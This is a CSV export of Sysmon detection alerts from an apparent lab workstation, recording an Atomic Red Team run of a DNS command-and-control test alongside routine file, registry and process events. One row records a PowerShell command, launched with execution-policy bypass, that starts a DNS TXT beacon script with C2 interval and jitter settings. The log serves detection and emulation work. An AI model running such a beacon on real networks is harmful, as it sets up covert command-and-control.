"2025-12-26 11:29:12.190 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175185,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\System.Text.Json.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.190 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.190","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.191 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175186,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\System.Threading.Channels.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.190 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.190","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.192 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175187,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\System.Threading.Tasks.Dataflow.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.190 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.192","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.193 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175188,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\UnexpectedExitHandlers.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.192 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.192","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.194 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175189,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\UserDataCache.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.192 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.192","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.194 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175190,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\VoiceClarity.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.192 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.192","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.195 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175191,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\VoiceClarityManaged.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.194 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.194","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.195 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175192,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\VoiceFabric.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.194 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.194","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.195 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175193,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\WebView2Loader.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.194 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.194","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.196 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175194,"Rule: EXE ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\WebViewHost.exe ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.194 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.196","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.197 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175195,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\WinRT.Host.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.196 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.196","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.197 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175196,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\WinRT.Host.Shim.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.196 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.196","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.204 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175197,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\WinRT.Runtime.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.196 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.196","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.219 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175198,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\xpdAPI.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.198 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.198","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.219 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175199,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\zlib1.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.198 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.198","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:15.378 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175451,"Rule: DLL ¦ Path: C:\Users\student\AppData\Local\Temp\3stwtxwi\3stwtxwi.dll ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9956 ¦ PGUID: E9F06A57-63B1-694E-5F02-000000002400","CreationUtcTime: 2025-12-26 10:30:15.340 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:15.340","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:16.295 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175455,"Rule: DLL ¦ Path: C:\Users\student\AppData\Local\Temp\3stwtxwi\3stwtxwi.dll ¦ Proc: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ¦ PID: 8044 ¦ PGUID: E9F06A57-63B7-694E-6102-000000002400","CreationUtcTime: 2025-12-26 10:30:15.340 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:16.285","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:16.440 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175456,"Rule: DLL ¦ Path: C:\Users\student\AppData\Local\Temp\v5tccl0z\v5tccl0z.dll ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9956 ¦ PGUID: E9F06A57-63B1-694E-5F02-000000002400","CreationUtcTime: 2025-12-26 10:30:16.416 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:16.416","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:16.664 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175460,"Rule: DLL ¦ Path: C:\Users\student\AppData\Local\Temp\v5tccl0z\v5tccl0z.dll ¦ Proc: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ¦ PID: 9588 ¦ PGUID: E9F06A57-63B8-694E-6302-000000002400","CreationUtcTime: 2025-12-26 10:30:16.416 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:16.656","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:39.846 +01:00","Reg Key Create/Delete (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",12,"","","sysmon",175211,"Rule: T1060,RunKey ¦ EventType: DeleteValue ¦ TgtObj: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\RunNotification\StartupTNotivbsstartup.vbs ¦ Proc: C:\WINDOWS\System32\sihost.exe ¦ PID: 4260 ¦ PGUID: E9F06A57-5FEE-694E-6400-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:39.845","Sysmon_12_Med_RegKeyCreateDelete_RuleAlert.yml","f1529b76-82e8-4017-8348-7d1d75defb41","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:40.964 +01:00","Reg Key Create/Delete (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",12,"","","sysmon",175212,"Rule: T1060,RunKey ¦ EventType: DeleteValue ¦ TgtObj: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\RunNotification\StartupTNotijsestartup.jse ¦ Proc: C:\WINDOWS\System32\sihost.exe ¦ PID: 4260 ¦ PGUID: E9F06A57-5FEE-694E-6400-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:40.960","Sysmon_12_Med_RegKeyCreateDelete_RuleAlert.yml","f1529b76-82e8-4017-8348-7d1d75defb41","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:42.022 +01:00","Reg Key Create/Delete (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",12,"","","sysmon",175213,"Rule: T1060,RunKey ¦ EventType: DeleteValue ¦ TgtObj: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\RunNotification\StartupTNotibatstartup.bat ¦ Proc: C:\WINDOWS\System32\sihost.exe ¦ PID: 4260 ¦ PGUID: E9F06A57-5FEE-694E-6400-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:42.020","Sysmon_12_Med_RegKeyCreateDelete_RuleAlert.yml","f1529b76-82e8-4017-8348-7d1d75defb41","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:45.541 +01:00","Reg Key Create/Delete (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",12,"","","sysmon",175216,"Rule: T1060,RunKey ¦ EventType: DeleteValue ¦ TgtObj: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\RunNotification\StartupTNoticalc_exe.lnk ¦ Proc: C:\WINDOWS\System32\sihost.exe ¦ PID: 4260 ¦ PGUID: E9F06A57-5FEE-694E-6400-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:45.536","Sysmon_12_Med_RegKeyCreateDelete_RuleAlert.yml","f1529b76-82e8-4017-8348-7d1d75defb41","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:48.020 +01:00","Reg Key Create/Delete (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",12,"","","sysmon",175217,"Rule: T1060,RunKey ¦ EventType: DeleteValue ¦ TgtObj: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\RunNotification\StartupTNotisocks5_powershell ¦ Proc: C:\WINDOWS\System32\sihost.exe ¦ PID: 4260 ¦ PGUID: E9F06A57-5FEE-694E-6400-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:48.017","Sysmon_12_Med_RegKeyCreateDelete_RuleAlert.yml","f1529b76-82e8-4017-8348-7d1d75defb41","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:54.604 +01:00","Reg Key Create/Delete (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",12,"","","sysmon",175263,"Rule: T1060,RunKey ¦ EventType: DeleteValue ¦ TgtObj: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\RunNotification\StartupTNoticalc ¦ Proc: C:\WINDOWS\System32\sihost.exe ¦ PID: 4260 ¦ PGUID: E9F06A57-5FEE-694E-6400-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:54.603","Sysmon_12_Med_RegKeyCreateDelete_RuleAlert.yml","f1529b76-82e8-4017-8348-7d1d75defb41","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:47.613 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",174849,"Cmdline: ""powershell.exe"" & {Set-Location \""""C:\AtomicRedTeam\atomics\"""" .\T1071.004\src\T1071-dns-beacon.ps1 -Domain 127.0.0.1.nip.io -Subdomain atomicredteam -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 4728 ¦ PGUID: E9F06A57-6323-694E-4B02-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {Set-Location \""""C:\AtomicRedTeam\atomics\"""" .\T1071.004\src\T1071-dns-beacon.ps1 -Domain 127.0.0.1.nip.io -Subdomain atomicredteam -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:27:47.601","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:28:50.171 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",174854,"Cmdline: taskhostw.exe ¦ Proc: C:\Windows\System32\taskhostw.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\System32\svchost.exe -k netsvcs -p ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-5FE0-694E-E703-000000000000 ¦ PID: 6244 ¦ PGUID: E9F06A57-6362-694E-4D02-000000002400 ¦ ParentPID: 1400 ¦ ParentPGUID: E9F06A57-5FE2-694E-1C00-000000002400 ¦ Description: Host Process for Windows Tasks ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=3979F5BBEC9B7637719F9A096400A24A,SHA256=CAAAFB0C6F77CD37F402E644FC56B7D89E3D5FC51E128A4AC49481D281E582F8,IMPHASH=2196268E7A2880E3ADC74481297D0C4B","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: System ¦ ParentImage: C:\Windows\System32\svchost.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-26 10:28:50.154","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:28:56.942 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",174856,"Cmdline: ""C:\WINDOWS\system32\usoclient.exe"" StartWork ¦ Proc: C:\Windows\System32\UsoClient.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\System32\svchost.exe -k netsvcs -p ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-5FE0-694E-E703-000000000000 ¦ PID: 9832 ¦ PGUID: E9F06A57-6368-694E-4F02-000000002400 ¦ ParentPID: 1400 ¦ ParentPGUID: E9F06A57-5FE2-694E-1C00-000000002400 ¦ Description: UsoClient ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=EF80BF9A119930AF16BC044C49C47729,SHA256=218CCEC2BCDD01D8EF2065C9DE49C077AF1891639B5F264CC3A17F0E131D4761,IMPHASH=1BC6441172601AD7E84C0082681FF7D2","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2033 (WinBuild.160101.0800) ¦ IntegrityLevel: System ¦ ParentImage: C:\Windows\System32\svchost.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-26 10:28:56.938","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:28:58.518 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",174857,"Cmdline: taskhostw.exe ¦ Proc: C:\Windows\System32\taskhostw.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\System32\svchost.exe -k netsvcs -p ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-5FE0-694E-E703-000000000000 ¦ PID: 9224 ¦ PGUID: E9F06A57-636A-694E-5202-000000002400 ¦ ParentPID: 1400 ¦ ParentPGUID: E9F06A57-5FE2-694E-1C00-000000002400 ¦ Description: Host Process for Windows Tasks ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=3979F5BBEC9B7637719F9A096400A24A,SHA256=CAAAFB0C6F77CD37F402E644FC56B7D89E3D5FC51E128A4AC49481D281E582F8,IMPHASH=2196268E7A2880E3ADC74481297D0C4B","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: System ¦ ParentImage: C:\Windows\System32\svchost.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-26 10:28:58.512","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:07.321 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",174860,"Cmdline: taskhostw.exe -RegisterUserDevice -NewAccount ¦ Proc: C:\Windows\System32\taskhostw.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: C:\WINDOWS\System32\svchost.exe -k netsvcs -p ¦ LID: 0x18a9d ¦ LGUID: E9F06A57-5FE2-694E-9D8A-010000000000 ¦ PID: 9276 ¦ PGUID: E9F06A57-6373-694E-5402-000000002400 ¦ ParentPID: 1400 ¦ ParentPGUID: E9F06A57-5FE2-694E-1C00-000000002400 ¦ Description: Host Process for Windows Tasks ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=3979F5BBEC9B7637719F9A096400A24A,SHA256=CAAAFB0C6F77CD37F402E644FC56B7D89E3D5FC51E128A4AC49481D281E582F8,IMPHASH=2196268E7A2880E3ADC74481297D0C4B","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: Medium ¦ OriginalFileName: taskhostw.exe ¦ ParentImage: C:\Windows\System32\svchost.exe ¦ ParentUser: NT AUTHORITY\SYSTEM ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:29:07.289","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:07.476 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",174861,"Cmdline: taskhostw.exe -RegisterDevice -AccountChange ¦ Proc: C:\Windows\System32\taskhostw.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\System32\svchost.exe -k netsvcs -p ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-5FE0-694E-E703-000000000000 ¦ PID: 5412 ¦ PGUID: E9F06A57-6373-694E-5502-000000002400 ¦ ParentPID: 1400 ¦ ParentPGUID: E9F06A57-5FE2-694E-1C00-000000002400 ¦ Description: Host Process for Windows Tasks ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=3979F5BBEC9B7637719F9A096400A24A,SHA256=CAAAFB0C6F77CD37F402E644FC56B7D89E3D5FC51E128A4AC49481D281E582F8,IMPHASH=2196268E7A2880E3ADC74481297D0C4B","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: System ¦ OriginalFileName: taskhostw.exe ¦ ParentImage: C:\Windows\System32\svchost.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-26 10:29:07.471","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:07.993 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",174862,"Cmdline: C:\WINDOWS\servicing\TrustedInstaller.exe ¦ Proc: C:\Windows\servicing\TrustedInstaller.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\system32\services.exe ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-5FE0-694E-E703-000000000000 ¦ PID: 1608 ¦ PGUID: E9F06A57-6373-694E-5602-000000002400 ¦ ParentPID: 776 ¦ ParentPGUID: E9F06A57-5FDF-694E-0B00-000000002400 ¦ Description: Windows Modules Installer ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=BB07E09571013E061F55F3696EF61EA7,SHA256=701D13CA0A15D4C26520418CD6C9CBDC4F479751843CDB94597A6D5BF48C7FFE,IMPHASH=AB52561940CC63E2E5F7211055568874","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: System ¦ OriginalFileName: TrustedInstaller.exe ¦ ParentImage: C:\Windows\System32\services.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-26 10:29:07.981","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
